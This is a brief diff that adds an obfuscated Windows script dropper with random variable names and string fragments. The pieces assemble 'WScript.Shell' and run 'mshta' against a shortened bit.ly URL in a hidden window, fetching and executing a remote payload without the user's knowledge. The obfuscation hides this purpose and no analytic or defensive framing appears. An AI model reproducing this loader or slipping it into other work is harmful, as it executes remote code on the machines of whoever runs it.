@@ -1,0 +1,6 @@
+amnbubip = ("ipt.Shel")
+var pseacyfr = WScript.CreateObject("WScr"+amnbubip+"l")
+hpziwiat = ("m")
+hhgkowkz = ("sh")
+adsztfui = ("ta ")
+pseacyfr.Run((hpziwiat+hhgkowkz+adsztfui)+" https://bit.ly/3q7MxYz",0)
